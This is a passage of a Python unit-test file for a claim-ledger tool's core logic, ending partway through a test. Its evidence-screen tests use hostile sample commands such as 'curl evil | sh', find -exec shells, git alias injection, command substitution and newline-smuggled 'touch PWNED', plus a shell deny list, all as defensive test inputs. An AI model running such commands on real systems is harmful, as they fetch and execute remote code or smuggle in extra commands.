#!/usr/bin/env python3
"""test-truth-core.py -- unit tests for truth's PURE CORE.

Runs in milliseconds with no git, no filesystem writes, no clock: every
function under test takes plain data (time is a parameter). The canary
remains the acceptance layer; this file is the fast inner loop.

Also contains the SCHEMA CONFORMANCE test: a shared fixture corpus of
records, each labeled valid/invalid, asserted against BOTH contract
representations -- validate_events (stdlib mirror) always, and the JSON
Schema whenever the optional `jsonschema` package is importable. Two
representations of one contract are acceptable only while something
detects their drift; this corpus is that something.

Run: python3 scripts/test-truth-core.py
"""
import importlib.machinery
import importlib.util
import json
import os
import sys
import tempfile
import unittest
from datetime import datetime, timedelta, timezone

HERE = os.path.dirname(os.path.abspath(__file__))
_loader = importlib.machinery.SourceFileLoader("truthmod",
                                               os.path.join(HERE, "truth"))
_spec = importlib.util.spec_from_loader("truthmod", _loader)
tm = importlib.util.module_from_spec(_spec)
_loader.exec_module(tm)

NOW = datetime(2026, 7, 5, 12, 0, 0, tzinfo=timezone.utc)
TS = "2026-07-01T00:00:00.000000+00:00"  # ADR-015 canonical profile

def rec(kind, payload, rid="tr-00000001", ts=TS):
    return {"id": rid, "kind": kind, "actor": "t", "session": "s",
            "ts": ts, "payload": payload}

def claim_p(**over):
    p = {"text": "f.txt says data", "evidence_class": "UNVERIFIED",
         "cost_tier": "P2", "ttl_days": None, "evidence_paths": []}
    p.update(over)
    return p

def verified_p(**over):
    p = claim_p(evidence_class="VERIFIED",
                evidence={"command": "cat f.txt",
                          "output_hash": "sha256:" + "0" * 64,
                          "returncode": 0},
                anchor_commit="abc1234", evidence_paths=["f.txt"])
    p.update(over)
    return p

def events(*evs):
    return list(enumerate(evs, 1))

# ---------------------------------------------------------------- fold

class TestFold(unittest.TestCase):
    def test_empty(self):
        claims, premises = tm.fold([])
        self.assertEqual((claims, premises), ({}, {}))

    def test_claim_starts_unverified(self):
        claims, _ = tm.fold(events(rec("claim", claim_p())))
        self.assertEqual(claims["tr-00000001"]["status"], "unverified")
        self.assertEqual(claims["tr-00000001"]["status_ts"], TS)

    def test_last_event_wins(self):
        evs = events(
            rec("claim", claim_p()),
            rec("verdict", {"claim": "tr-00000001", "verdict": "agree",
                            "basis": "b"}, rid="tr-00000002"),
            rec("verdict", {"claim": "tr-00000001", "verdict": "diverge",
                            "basis": "b"}, rid="tr-00000003",
                ts="2026-07-02T00:00:00+00:00"))
        claims, _ = tm.fold(evs)
        self.assertEqual(claims["tr-00000001"]["status"], "diverged")
        self.assertEqual(claims["tr-00000001"]["status_ts"],
                         "2026-07-02T00:00:00+00:00")

    def test_every_verdict_mapping(self):
        for verdict, status in (("agree", "live"), ("diverge", "diverged"),
                                ("cannot_verify", "cannot_verify"),
                                ("retracted", "retracted")):
            claims, _ = tm.fold(events(
                rec("claim", claim_p()),
                rec("verdict", {"claim": "tr-00000001", "verdict": verdict,
                                "basis": "b"}, rid="tr-00000002")))
            self.assertEqual(claims["tr-00000001"]["status"], status, verdict)

    def test_invalidation_marks_stale(self):
        claims, _ = tm.fold(events(
            rec("claim", claim_p()),
            rec("invalidation", {"claim": "tr-00000001", "commit": "abc1234",
                                 "reason": "x"}, rid="tr-00000002")))
        self.assertEqual(claims["tr-00000001"]["status"], "stale")

    def test_retracted_is_terminal(self):
        evs = events(
            rec("claim", claim_p()),
            rec("verdict", {"claim": "tr-00000001", "verdict": "retracted",
                            "basis": "wrong"}, rid="tr-00000002"),
            rec("verdict", {"claim": "tr-00000001", "verdict": "agree",
                            "basis": "resurrect"}, rid="tr-00000003",
                ts="2026-07-03T00:00:00+00:00"),
            rec("invalidation", {"claim": "tr-00000001", "commit": "abc1234"},
                rid="tr-00000004"))
        claims, _ = tm.fold(evs)
        self.assertEqual(claims["tr-00000001"]["status"], "retracted")
        self.assertEqual(claims["tr-00000001"]["status_ts"], TS)  # unchanged

    def test_negative_verdicts_are_recoverable(self):
        """ADR-020 (H3): diverged, cannot_verify, and stale all recover to
        live via a later agree -- only retracted is terminal."""
        for kind, payload in (
            ("verdict", {"claim": "tr-00000001", "verdict": "diverge", "basis": "b"}),
            ("verdict", {"claim": "tr-00000001", "verdict": "cannot_verify", "basis": "b"}),
            ("invalidation", {"claim": "tr-00000001", "commit": "abc1234", "reason": "x"}),
        ):
            claims, _ = tm.fold(events(
                rec("claim", claim_p()),
                rec(kind, payload, rid="tr-00000002"),
                rec("verdict", {"claim": "tr-00000001", "verdict": "agree",
                                "basis": "rechecked"}, rid="tr-00000003",
                    ts="2026-07-05T00:00:00.000000+00:00")))
            self.assertEqual(claims["tr-00000001"]["status"], "live", kind)

    def test_retracted_absorbs_in_any_order(self):
        """ADR-020: retracted wins whether earlier or later than another
        verdict and independent of physical order -- set_status short-
        circuits on the FOLDED status, not on ts."""
        import itertools
        claim = rec("claim", claim_p())
        agree = rec("verdict", {"claim": "tr-00000001", "verdict": "agree",
                                "basis": "b"}, rid="tr-0000000a",
                    ts="2026-07-10T00:00:00.000000+00:00")   # LATER than retract
        retr = rec("verdict", {"claim": "tr-00000001", "verdict": "retracted",
                               "basis": "kill"}, rid="tr-0000000b",
                   ts="2026-07-05T00:00:00.000000+00:00")    # EARLIER than agree
        for perm in itertools.permutations([claim, agree, retr]):
            claims, _ = tm.fold(events(*perm))
            self.assertEqual(claims["tr-00000001"]["status"], "retracted", perm)

    def test_verdict_precedence_is_confluent(self):
        """ADR-020 (H3): the anti-C1 lock. Distinct-id verdicts on one
        claim, folded in EVERY physical order, yield ONE status -- the
        highest-key (ts,id,canon) setter wins, so backdating cannot change
        the outcome. C1 broke confluence; the verdict path does not."""
        import itertools
        claim = rec("claim", claim_p())
        agree = rec("verdict", {"claim": "tr-00000001", "verdict": "agree",
                                "basis": "b"}, rid="tr-0000000a",
                    ts="2026-07-05T00:00:00.000000+00:00")
        cverif = rec("verdict", {"claim": "tr-00000001", "verdict": "cannot_verify",
                                 "basis": "b"}, rid="tr-0000000b",
                     ts="2026-07-08T00:00:00.000000+00:00")
        diverge = rec("verdict", {"claim": "tr-00000001", "verdict": "diverge",
                                  "basis": "b"}, rid="tr-0000000c",
                      ts="2026-07-10T00:00:00.000000+00:00")
        seen = set()
        for perm in itertools.permutations([claim, agree, cverif, diverge]):
            claims, _ = tm.fold(events(*perm))
            seen.add(claims["tr-00000001"]["status"])
        self.assertEqual(seen, {"diverged"})  # diverge@07-10 is the highest key
        # The reviewer's worked example: cannot_verify@5 then backdated
        # agree@3 -> cannot_verify (5 is the higher key), in every order.
        cv5 = rec("verdict", {"claim": "tr-00000001", "verdict": "cannot_verify",
                              "basis": "b"}, rid="tr-0000000d",
                  ts="2026-07-05T00:00:00.000000+00:00")
        ag3 = rec("verdict", {"claim": "tr-00000001", "verdict": "agree",
                              "basis": "backdated"}, rid="tr-0000000e",
                  ts="2026-07-03T00:00:00.000000+00:00")
        for perm in itertools.permutations([claim, cv5, ag3]):
            claims, _ = tm.fold(events(*perm))
            self.assertEqual(claims["tr-00000001"]["status"], "cannot_verify", perm)

    def test_premise_map(self):
        _, premises = tm.fold(events(
            rec("premise", {"issue": "bd-x1", "claim": "tr-00000009"})))
        self.assertEqual(premises, {"bd-x1": ["tr-00000009"]})

# ------------------------------------------------------- premise matrix

class TestPremiseMatrix(unittest.TestCase):
    def test_adr_001(self):
        cases = [
            ("live", "P0", True), ("live", "P2", True),
            ("unverified", "P0", True), ("unverified", "P2", True),
            ("cannot_verify", "P0", False),          # strict for P0
            ("cannot_verify", "P1", True),
            ("cannot_verify", "P2", True),
            ("stale", "P2", False), ("diverged", "P0", False),
            ("retracted", "P1", False), ("missing", "P2", False),
        ]
        for status, tier, expect in cases:
            passes, _ = tm.premise_check(status, tier)
            self.assertEqual(passes, expect, (status, tier))

    def test_warnings_present(self):
        self.assertIsNotNone(tm.premise_check("unverified", "P1")[1])
        self.assertIsNotNone(tm.premise_check("cannot_verify", "P1")[1])
        self.assertIsNone(tm.premise_check("live", "P1")[1])

# --------------------------------------------------------- primitives

class TestPrimitives(unittest.TestCase):
    def test_match_paths(self):
        self.assertTrue(tm.match_paths("services/api/x.py", ["services/api/**"]))
        self.assertTrue(tm.match_paths("services/api", ["services/api/**"]))
        self.assertFalse(tm.match_paths("services/apix/x.py", ["services/api/**"]))
        self.assertTrue(tm.match_paths("f.txt", ["*.txt"]))
        self.assertFalse(tm.match_paths("f.py", ["*.txt"]))

    def test_jaccard(self):
        self.assertEqual(tm.jaccard("a b c", "a b c"), 1.0)
        self.assertEqual(tm.jaccard("a b", "c d"), 0.0)
        self.assertEqual(tm.jaccard("", "a"), 0.0)

    def test_duplicate_conflicts_only_active(self):
        # ADR-018: "active" is exactly {live, unverified}; every other
        # status is dead-for-intake and a correcting refile is allowed.
        base = "payments module handles currency conversion"
        claims = {"tr-0000000a": {"status": "live",
                                  "claim": rec("claim", claim_p(text=base))}}
        for i, dead in enumerate(("stale", "diverged", "cannot_verify",
                                  "retracted", "disputed")):
            claims[f"tr-0000010{i}"] = {"status": dead,
                                        "claim": rec("claim", claim_p(text=base))}
        hits = tm.duplicate_conflicts("payments module handles all currency conversion", claims)
        self.assertEqual([cid for cid, _ in hits], ["tr-0000000a"])  # only the live one

    def test_near_dup_metric_is_jaccard_not_overlap(self):
        """ADR-018 (H1): the near-dup metric is symmetric Jaccard, not the
        overlap coefficient a vague "overlap >= 0.6" reading invites. The
        two diverge on a strict token-subset (an elaboration of an
        existing claim): Jaccard accepts it, overlap-coefficient refuses
        it. Pin the reference to Jaccard so two implementers cannot
        diverge across the 0.6 boundary."""
        a = "auth module owns login"
        b = "auth module owns login and also owns logout and session refresh handling"
        ta, tb = tm.tokens(a), tm.tokens(b)
        self.assertTrue(ta <= tb)  # a's tokens are a strict subset of b's
        inter = len(ta & tb)
        # Reference metric: Jaccard = 4/10 = 0.4 -> below 0.6 -> NOT a duplicate.
        self.assertAlmostEqual(tm.jaccard(a, b), 0.4)
        self.assertLess(tm.jaccard(a, b), tm.DUPLICATE_THRESHOLD)
        # The overlap coefficient on the same tokens is 1.0 -> a conforming
        # implementer who read "overlap" literally would REFUSE. Proof the
        # spec ambiguity was real and is now resolved away from it.
        overlap_coeff = inter / min(len(ta), len(tb))
        self.assertEqual(overlap_coeff, 1.0)
        self.assertGreaterEqual(overlap_coeff, tm.DUPLICATE_THRESHOLD)
        # At the gate: b is accepted against an active a (no conflict row).
        claims = {"tr-0000000a": {"status": "live",
                                  "claim": rec("claim", claim_p(text=a))}}
        self.assertEqual(tm.duplicate_conflicts(b, claims), [])

# ---------------------------------------------------- intake decisions

class TestIntake(unittest.TestCase):
    def test_verified_requires_cmd_paths_head(self):
        self.assertIn("INV-B", tm.verified_intake_error(None, ["f"], None, "abc"))
        self.assertIn("G10", tm.verified_intake_error("cat f", [], None, "abc"))
        self.assertIsNone(tm.verified_intake_error("cat f", [], 7, "abc"))  # ttl ok
        self.assertIn("G1", tm.verified_intake_error("cat f", ["f"], None, None))
        self.assertIsNone(tm.verified_intake_error("cat f", ["f"], None, "abc"))

    def test_inferred_requires_basis(self):
        self.assertIsNotNone(tm.inferred_intake_error(None))
        self.assertIsNone(tm.inferred_intake_error("naming convention"))

    def test_determinism(self):
        self.assertIsNone(tm.determinism_error(("h", 0), ("h", 0)))
        self.assertIn("G6", tm.determinism_error(("h1", 0), ("h2", 0)))
        self.assertIn("G6", tm.determinism_error(("h", 0), ("h", 1)))

    def test_malformed_path_list(self):
        """INV-M: '--paths "a.sh b.sh"' with no comma stores as one
        whitespace-containing literal -- the exact tr-3591aae0 shape."""
        self.assertEqual(tm.malformed_path_list(["a.sh b.sh"]), ["a.sh b.sh"])
        self.assertEqual(tm.malformed_path_list(["a.sh", "b.sh"]), [])
        self.assertEqual(tm.malformed_path_list(["a.sh", "b.sh", "c d.sh"]),
                         ["c d.sh"])
        self.assertEqual(tm.malformed_path_list([]), [])

    def test_split_csv_drops_empty_entries(self):
        """v0.5.6: a trailing or doubled comma must never surface as a
        refusal of the literal '' (the pre-fix behavior was fails-closed
        but cryptic: dead_literal_paths reported [''])."""
        self.assertEqual(tm.split_csv("a.sh,"), ["a.sh"])
        self.assertEqual(tm.split_csv("a.sh,,b.sh"), ["a.sh", "b.sh"])
        self.assertEqual(tm.split_csv(" a.sh , b.sh "), ["a.sh", "b.sh"])
        self.assertEqual(tm.split_csv(","), [])
        self.assertEqual(tm.split_csv(""), [])
        self.assertEqual(tm.split_csv(None), [])

    def test_dead_literal_paths(self):
        """INV-M: a literal matching zero tracked files is a dead
        tripwire; explicit globs are exempt even at zero matches."""
        tracked = ["a.sh", "src/x.py"]
        self.assertEqual(tm.dead_literal_paths(["a.sh"], tracked), [])
        self.assertEqual(tm.dead_literal_paths(["missing.sh"], tracked),
                         ["missing.sh"])
        self.assertEqual(tm.dead_literal_paths(["docs/*.md"], tracked), [])
        self.assertEqual(tm.dead_literal_paths(["src/?.py"], tracked), [])
        self.assertEqual(
            tm.dead_literal_paths(["a.sh", "missing.sh", "docs/*.md"], tracked),
            ["missing.sh"])

    def test_dead_literal_is_the_decidable_case(self):
        """ADR-023 (H5): the gate decides STATIC deadness of LITERALS only.
        A literal has exactly one referent, so a zero-match literal can
        never fire and is refused; a glob names a namespace that can fill,
        so it is exempt even at zero current matches (dormant, not dead).
        The lone residual is a tracked symlink literal -- it IS in the
        tracked set, so the membership check passes; the gate is blind to
        the fact that git tracks the link, not its target (ADR-023 leaves
        this to guidance: watch real paths)."""
        tracked = ["a.sh", "link.txt"]        # link.txt stands in for a tracked symlink
        # a literal absent from the tracked set is statically dead -> refused
        self.assertEqual(tm.dead_literal_paths(["missing.sh"], tracked),
                         ["missing.sh"])
        # a glob is never refused for zero current matches -- it is dormant
        self.assertEqual(tm.dead_literal_paths(["src/ghost/*.py"], tracked), [])
        # residual: a tracked symlink literal passes the membership check
        self.assertEqual(tm.dead_literal_paths(["link.txt"], tracked), [])

    def test_dead_glob_paths_refuses_unreachable(self):
        """ADR-024 (H5 follow-up): a glob is exempt from the dead-literal
        gate, but a glob matching no path git diff could emit is a dead
        tripwire all the same. git-diff paths are repo-relative, normalized,
        never under .git -- so an absolute pattern, a trailing slash, a
        '.'/'..'/empty component, or a leading '.git' component is dead.
        These are exactly the shapes an adversarial verifier found slipping
        the exemption; each is flagged."""
        for g in ["/etc/*.conf", "zone/*/", "a*/", "../*.txt", "./src/*.py",
                  "a/./b*.py", "dbl//*.txt", ".git/*", ".git/**"]:
            self.assertEqual(tm.dead_glob_paths([g]), [g], g)

    def test_dead_glob_paths_keeps_reachable(self):
        """ADR-024: SOUND, not complete -- no false refusals. Every glob
        over a reachable namespace passes, including the two that look like
        the dead shapes but are not: '.git*' matches .gitignore, and
        '.github/**' is an ordinary tracked directory."""
        for g in ["src/**", "src/*/test.py", "**/*.py", "*.txt", "src/?.py",
                  "a/b*.py", "**", "*", ".git*", ".github/**"]:
            self.assertEqual(tm.dead_glob_paths([g]), [], g)
        # a plain literal is not this gate's concern (dead_literal_paths owns it)
        self.assertEqual(tm.dead_glob_paths(["src/main.py"]), [])

    def test_ci_gate_names_detects_and_misses(self):
        """ADR-025 (H6): doctor decides the CI arm of the commit-gate MUST
        by grepping known CI configs for the gate script name -- so a
        CI-only repo passes instead of false-failing. A workflow naming the
        gate is found (under .github/workflows and at top-level CI paths);
        an unrelated file is not; a repo with no CI config yields None."""
        with tempfile.TemporaryDirectory() as root:
            wf = os.path.join(root, ".github", "workflows")
            os.makedirs(wf)
            # no CI naming the gate yet
            self.assertIsNone(tm.ci_gate_names("check-truth", root))
            # an unrelated workflow does NOT satisfy the gate
            with open(os.path.join(wf, "lint.yml"), "w") as f:
                f.write("jobs:\n  lint:\n    steps:\n      - run: ruff .\n")
            self.assertIsNone(tm.ci_gate_names("check-truth", root))
            # a workflow naming the gate script IS found, and the path is returned
            with open(os.path.join(wf, "truth.yml"), "w") as f:
                f.write("jobs:\n  gate:\n    steps:\n      - run: bash scripts/check-truth.sh\n")
            self.assertEqual(tm.ci_gate_names("check-truth", root),
                             os.path.join(".github", "workflows", "truth.yml"))
            # a top-level CI file (e.g. .gitlab-ci.yml) is scanned too
            with open(os.path.join(root, ".gitlab-ci.yml"), "w") as f:
                f.write("gate:\n  script: python scripts/truth invalidate-scan\n")
            self.assertEqual(tm.ci_gate_names("invalidate-scan", root),
                             ".gitlab-ci.yml")

    def test_ci_gate_names_top_level_yaml_only(self):
        """ADR-025 (H6 adversarial fix): CI runs only TOP-LEVEL *.yml/*.yaml
        under .github/workflows/, so doctor must too -- a `disabled/` subdir
        or a `.yml.disabled` rename is a gate CI never runs and must NOT
        satisfy the MUST (else doctor reports a deliberately-off gate as OK)."""
        with tempfile.TemporaryDirectory() as root:
            wf = os.path.join(root, ".github", "workflows")
            os.makedirs(os.path.join(wf, "disabled"))
            # (a) workflow in a subdirectory -- GitHub never runs it
            with open(os.path.join(wf, "disabled", "truth.yml"), "w") as f:
                f.write("run: bash scripts/check-truth.sh\n")
            self.assertIsNone(tm.ci_gate_names("check-truth", root))
            # (b) rename-to-disable: the standard "turn this off" idiom
            with open(os.path.join(wf, "truth.yml.disabled"), "w") as f:
                f.write("run: bash scripts/check-truth.sh\n")
            self.assertIsNone(tm.ci_gate_names("check-truth", root))
            # (c) a genuine top-level .yaml (not just .yml) IS scanned
            with open(os.path.join(wf, "gate.yaml"), "w") as f:
                f.write("run: bash scripts/check-truth.sh\n")
            self.assertEqual(tm.ci_gate_names("check-truth", root),
                             os.path.join(".github", "workflows", "gate.yaml"))

# ------------------------------------- quantifier-scope gate (ADR-007)

class TestQuantifierScope(unittest.TestCase):
    def test_fires_on_the_pilot_shape(self):
        """A repo-wide clause over an --include-filtered grep: the exact
        shape of both genuine pilot divergences."""
        c = tm.quantifier_scope_conflict(
            "the only occurrences in the repo are in payments",
            "grep -rn convert --include='*.py' .")
        self.assertIsNotNone(c)
        q, s = c
        self.assertIn(q, ("only", "the repo"))  # both fire; either names it
        self.assertTrue(s.startswith("--include"), s)

    def test_fires_on_path_scoped_command(self):
        self.assertIsNotNone(tm.quantifier_scope_conflict(
            "no call sites remain anywhere", "grep -rn frobnicate src/api"))

    def test_phrase_boundary_repo_vs_repository(self):
        """'the repo' must not fire inside 'the repository'."""
        self.assertIsNone(tm.quantifier_scope_conflict(
            "the repository layer caches sessions and misses stay cheap",
            "grep -rn cache --include='*.py'"))

    def test_silent_without_quantifier(self):
        self.assertIsNone(tm.quantifier_scope_conflict(
            "payments module converts currency",
            "grep -rn convert --include='*.py' ."))

    def test_silent_without_scoping(self):
        self.assertIsNone(tm.quantifier_scope_conflict(
            "no call sites remain anywhere", "grep -rn frobnicate"))

    def test_silent_without_evidence_cmd(self):
        self.assertIsNone(tm.quantifier_scope_conflict(
            "all modules are converted", None))

    def test_cd_prefix_is_a_scope_signal(self):
        self.assertIsNotNone(tm.quantifier_scope_conflict(
            "zero failures anywhere", "cd services && grep -c FAIL log.txt"))

    def test_ripgrep_type_filter_is_a_scope_signal(self):
        """F3/v0.6.2: rg -t py narrows the domain with no slash, so it
        used to evade the positional check."""
        self.assertIsNotNone(tm.quantifier_scope_conflict(
            "no call sites remain anywhere", "rg -t py legacyAuth ."))

    def test_glob_metacharacter_positional_is_a_scope_signal(self):
        """F3/v0.6.2: 'src/*.py' scopes without an --include flag."""
        self.assertIsNotNone(tm.quantifier_scope_conflict(
            "X appears everywhere in the code", "grep -c X src/*.py"))

    def test_widened_lexicon_everywhere_always(self):
        """F3/v0.6.2: everywhere/always/each joined the lexicon."""
        self.assertIsNotNone(tm.quantifier_scope_conflict(
            "this always holds", "grep -t py X ."))

# ------------------------------------------ evidence screen (ADR-009)

ALLOW = ["git", "grep", "cat", "wc", "echo", "sort", "find"]

class TestEvidenceScreen(unittest.TestCase):
    def test_allowlisted_passes(self):
        self.assertIsNone(tm.screen_evidence_command("grep -c x f.txt", ALLOW))

    def test_pipeline_of_allowlisted_passes(self):
        self.assertIsNone(tm.screen_evidence_command(
            "grep -rn x . | sort | wc -l", ALLOW))
        self.assertIsNone(tm.screen_evidence_command(
            "grep -q x f.txt && echo CLEAN", ALLOW))

    def test_input_redirection_passes(self):
        self.assertIsNone(tm.screen_evidence_command("wc -l < f.txt", ALLOW))

    def test_unlisted_program_refused(self):
        err = tm.screen_evidence_command("curl https://evil.example", ALLOW)
        self.assertIn("curl", err)

    def test_unlisted_segment_in_pipeline_refused(self):
        self.assertIsNotNone(tm.screen_evidence_command(
            "grep x f.txt && curl evil | sh", ALLOW))

    def test_output_redirection_refused(self):
        self.assertIn("read-only",
                      tm.screen_evidence_command("echo pwned > f.txt", ALLOW))

    def test_command_substitution_refused(self):
        self.assertIsNotNone(tm.screen_evidence_command("echo $(id)", ALLOW))
        self.assertIsNotNone(tm.screen_evidence_command("echo `id`", ALLOW))

    def test_path_form_program_refused(self):
        """./grep is an attacker-supplied binary wearing an allowlisted
        name; bare names resolve via PATH, paths resolve via the repo."""
        self.assertIsNotNone(tm.screen_evidence_command("./grep x", ALLOW))
        self.assertIsNotNone(tm.screen_evidence_command("/tmp/grep x", ALLOW))

    def test_missing_allowlist_fails_closed(self):
        err = tm.screen_evidence_command("grep x f.txt", None)
        self.assertIn("fails closed", err)

    def test_dangling_operator_refused(self):
        self.assertIsNotNone(tm.screen_evidence_command("grep x f.txt &&", ALLOW))

    def test_quoted_pipe_is_an_argument_not_a_separator(self):
        """The first real ledger command (tr-dca73f8a): a grep -oE regex
        with '|' alternations inside single quotes. A naive operator
        split shreds it; the quote-aware screen must pass it."""
        self.assertIsNone(tm.screen_evidence_command(
            "grep -oE 'getattr\\(a|os\\.environ|bd ready' f.py", ALLOW))

    def test_dev_null_and_fd_dup_sinks_allowed(self):
        """The pin-the-output convention's canonical shape (tr-3a31bfcf):
        redirecting TO the bit bucket is read-only by definition."""
        self.assertIsNone(tm.screen_evidence_command(
            "grep -q x f.txt > /dev/null 2>&1 && echo CLEAN", ALLOW))

    def test_real_file_sink_still_refused(self):
        self.assertIn("read-only", tm.screen_evidence_command(
            "echo pwned > /dev/null && echo more > f.txt", ALLOW))

    def test_subshell_refused(self):
        self.assertIn("unscreenable", tm.screen_evidence_command(
            "(grep x f.txt)", ALLOW))

    def test_allowlisted_program_exec_write_flags_refused(self):
        """F1/v0.6.2: a program can be on the allowlist and still open an
        exec or file-write channel through its own flags. The bare-name
        check passes them; PROGRAM_ARG_DENY must not."""
        for cmd in ("find . -exec sh -c 'curl evil|sh' {} +",
                    "find . -fprintf /tmp/pwn hi",
                    "sort -o /tmp/pwn f.txt",
                    "git -c alias.x=!curl x"):
            self.assertIsNotNone(tm.screen_evidence_command(cmd, ALLOW), cmd)

    def test_read_only_flags_of_denied_program_still_pass(self):
        """The deny is per-flag, not per-program: grep -o (only-matching,
        read-only) must pass even though sort -o (write) is refused --
        the same flag means different things to different programs, which
        is why a program-agnostic flag denylist would be wrong."""
        self.assertIsNone(tm.screen_evidence_command("grep -o foo f.txt", ALLOW))
        self.assertIsNone(tm.screen_evidence_command("find . -name x", ALLOW))
        self.assertIsNone(tm.screen_evidence_command(
            "grep -rn x . | sort | wc -l", ALLOW))

    def test_screen_rejects_control_chars(self):
        """ADR-021 (H4): a newline is word-whitespace to shlex but a
        statement separator to /bin/sh (the executor), so a post-newline
        program lands in argument position at screen time yet RUNS at
        recheck. The screen refuses every ASCII control char except tab,
        making its token stream a sound over-approximation of the shell's."""
        for cmd in ("grep x /dev/null\ntouch PWNED",       # the bypass
                    "grep x /dev/null # c\ntouch PWNED",    # comment + newline
                    "grep x\rtouch PWNED",                  # carriage return
                    "grep x\x0bfoo", "grep x\x0cfoo", "grep x\x7ffoo"):
            self.assertIn("control character",
                          tm.screen_evidence_command(cmd, ALLOW), repr(cmd))
        # tab is word-whitespace to BOTH lexers -- legitimate, must pass
        self.assertIsNone(tm.screen_evidence_command("grep\tx\tf.txt", ALLOW))

    def test_arg_deny_covers_h4_gaps(self):
        """ADR-021 (H4): the adversarial review found enumerable exec/write
        flags on SHIPPED programs the deny table missed -- git lowercase
        -o (only -O/--output were denied, so `git archive -o` wrote files)
        and GNU `sort --compress-program=<cmd>` (an exec channel). Both
        refused now; the table's contents are pinned against silent drift."""
        self.assertIsNotNone(
            tm.screen_evidence_command("git archive -o /tmp/pwn HEAD", ALLOW))
        self.assertIsNotNone(tm.screen_evidence_command(
            "sort --compress-program=touch -S1 f.txt", ALLOW))
        self.assertLessEqual({"-o", "--output", "--compress-program"},
                             tm.PROGRAM_ARG_DENY["sort"])
        self.assertIn("-o", tm.PROGRAM_ARG_DENY["git"])

    def test_denylist_wins_over_allowlist(self):
        """ADR-022: a shell/executor on the template-owned deny baseline is
        refused even when the consumer allowlisted it (deny-wins), because
        allowlisting a shell turns the read-only screen into arbitrary
        execution. A non-denied program is unaffected."""
        deny = ["bash", "sh", "env", "xargs", "time"]
        err = tm.screen_evidence_command("bash -c 'echo hi'", ["bash", "grep"],
                                         denylist=deny)
        self.assertIsNotNone(err)
        self.assertIn("evidence-deny", err)
        # env as a program (a generic executor) is refused even if allowed
        self.assertIsNotNone(tm.screen_evidence_command(
            "env grep x f.txt", ["env", "grep"], denylist=deny))
        # `time <cmd>` runs <cmd> as an argument the screen never program-
        # checks -- adversary-confirmed RCE if allowlisted; deny closes it
        self.assertIsNotNone(tm.screen_evidence_command(
            "time bash -c 'touch x'", ["time", "bash"], denylist=deny))
        # a normal allowlisted program is untouched by the deny layer
        self.assertIsNone(tm.screen_evidence_command(
            "grep x f.txt", ["grep"], denylist=deny))
        # an absent deny file (denylist=None) fails open: allowlist governs
        self.assertIsNone(tm.screen_evidence_command(
            "grep x f.txt", ["grep"], denylist=None))

    def test_deny_baseline_not_applied_to_oracles(self):
        """ADR-022: the deny baseline is evidence-only. Acceptance oracles
        (ADR-014) execute repository code on purpose -- `bash run.sh` is
        their normal shape -- so screen_accept_command passes no denylist."""
        self.assertIsNone(tm.screen_accept_command("bash run-tests.sh",
                                                   ["bash"]))

    def test_doctor_grey_zone_set(self):
        """ADR-022: the doctor advisory set names code-executing programs
        with plausible read-only uses (warned, not blocked). Read-only
        staples are NOT in it (they would warn spuriously)."""
        self.assertLessEqual({"git", "python", "curl", "pytest", "sed"},
                             tm.DOCTOR_GREY_ZONE)
        self.assertTrue(tm.DOCTOR_GREY_ZONE.isdisjoint(
            {"grep", "cat", "wc", "find", "sort", "test"}))

class TestAcceptScreen(unittest.TestCase):
    """ADR-014: same structural screen, its own allowlist -- the refusal
    messages must name .truth/accept-allow and the accept escape hatch,
    never ADR-009's evidence vocabulary (a message naming the wrong list
    teaches the wrong fix)."""
    ACC = ["pytest", "bash", "python3"]

    def test_allowlisted_oracle_passes(self):
        self.assertIsNone(tm.screen_accept_command("pytest -q tests", self.ACC))
        self.assertIsNone(tm.screen_accept_command(
            "python3 exercises/harness/runner.py leg --strict", self.ACC))

    def test_unlisted_program_names_accept_allow(self):
        err = tm.screen_accept_command("cargo test", self.ACC)
        self.assertIn(tm.ACCEPT_ALLOW_REL, err)
        self.assertIn("--accept-unsafe-ok", err)
        self.assertNotIn(tm.EVIDENCE_ALLOW_REL, err)

    def test_missing_allowlist_fails_closed_naming_accept_allow(self):
        err = tm.screen_accept_command("pytest -q", None)
        self.assertIn(tm.ACCEPT_ALLOW_REL, err)
        self.assertIn("--accept-cmd", err)

    def test_structural_rules_still_apply(self):
        # one screen implementation (the F1/F5 drift lesson): command
        # substitution, path-form programs, and real-file sinks are
        # refused for oracles exactly as for evidence
        self.assertIsNotNone(tm.screen_accept_command(
            "pytest $(cat pwn)", self.ACC))
        self.assertIsNotNone(tm.screen_accept_command(
            "./run_tests.sh", self.ACC))
        self.assertIsNotNone(tm.screen_accept_command(
            "pytest -q > results.txt", self.ACC))

    def test_path_form_entry_admits_exact_oracle(self):
        """Issue #7: an allowlisted exact repo-relative path runs as an
        oracle; near-misses and traversals do not."""
        acc = ["bash", ".venv/bin/python", "./gradlew"]
        self.assertIsNone(tm.screen_accept_command(
            ".venv/bin/python scripts/test-truth-core.py", acc))
        self.assertIsNone(tm.screen_accept_command("./gradlew test", acc))
        # exact match only -- a different path is refused with the hint
        err = tm.screen_accept_command(".venv/bin/pytest -q", acc)
        self.assertIn(tm.ACCEPT_ALLOW_REL, err)
        # unlisted path still refused
        self.assertIsNotNone(tm.screen_accept_command("./run.sh", acc))

    def test_path_form_entry_never_absolute_or_traversal(self):
        # even a LISTED absolute or ..-path is refused -- the entry is
        # inert, not a policy the screen will honor
        acc = ["/usr/bin/python3", "../outside/tool", ".venv/bin/python"]
        self.assertIsNotNone(tm.screen_accept_command(
            "/usr/bin/python3 -m pytest", acc))
        self.assertIsNotNone(tm.screen_accept_command(
            "../outside/tool run", acc))

    def test_evidence_screen_still_refuses_paths_unconditionally(self):
        # ADR-009 unchanged: a path program is refused for EVIDENCE even
        # if some allowlist listed it -- different trust seam
        self.assertIsNotNone(tm.screen_evidence_command(
            ".venv/bin/python x.py", ALLOW + [".venv/bin/python"]))

    def test_evidence_screen_messages_unchanged(self):
        # regression: the parameterization must not rewrite ADR-009's
        # messages -- they still name evidence-allow and its escape hatch
        err = tm.screen_evidence_command("curl x", ALLOW)
        self.assertIn(tm.EVIDENCE_ALLOW_REL, err)
        self.assertIn("--evidence-unsafe-ok", err)
        err = tm.screen_evidence_command("grep x f.txt", None)
        self.assertIn(tm.EVIDENCE_ALLOW_REL, err)

# --------------------------------------------- order coherence (ADR-008)

class TestOrderCheck(unittest.TestCase):
    T1, T2, T3 = ("2026-07-01T00:00:00+00:00", "2026-07-02T00:00:00+00:00",
                  "2026-07-03T00:00:00+00:00")

    def test_backdated_duplicate_id_is_an_error(self):
        evs = events(rec("claim", claim_p(), ts=self.T2),
                     rec("claim", claim_p(text="substitution"), ts=self.T1))
        errors, _ = tm.order_check(evs)
